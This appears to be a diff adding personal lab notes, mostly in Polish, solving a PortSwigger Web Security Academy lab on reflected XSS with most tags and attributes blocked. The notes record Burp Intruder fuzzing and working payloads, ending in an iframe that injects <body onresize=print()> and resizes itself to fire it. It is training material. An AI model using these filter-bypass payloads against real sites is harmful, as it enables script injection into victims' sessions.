@@ -1,0 +1,45 @@
+Lab: Reflected XSS into HTML context with most tags and attributes blocked
+
+
+Event:    click         →    Atrybut:   onclick
+Event:    load          →    Atrybut:   onload
+Event:    mouseover     →    Atrybut:   onmouseover
+Event:    message       →    Atrybut:   onmessage
+
+<img src=1 onerror=print()>
+
+
+tags not allow
+
+intruder <§§>
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+wynik:
+body 200
+
+np. (znalezione w chat sheet) <body onhashchange="print()">     ---> attributre not allowed
+
+intruder 
+<body%2§§0>
+<body%20§§=1>
+
+<body onresize=print()>
+
+PAYLOAD:
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+
+WYJASNIENIE:
+Problem: onresize odpala się gdy zmienia się rozmiar okna. Jeśli ofiara po prostu wejdzie na stronę (payload z location) – nic się nie zmieni, event nie odpali!
+iframe – możesz kontrolować rozmiar
+<iframe src="https://cel.com/?search=<body onresize=print()>" 
+        onload="this.style.width='100px'">
+
+→ wstrzyknij nowy <body onresize=print()>
+→ iframe zmienia rozmiar
+→ onresize odpala print()
+→ XSS udowodniony! 🎯
+
+WYJSNIENIE2:
+Ofiara klika link do exploit-server 
+→ tam jest payload skrojony pod konkretny sklep
+→ gdzie ofiara ma konto i jest zalogowana
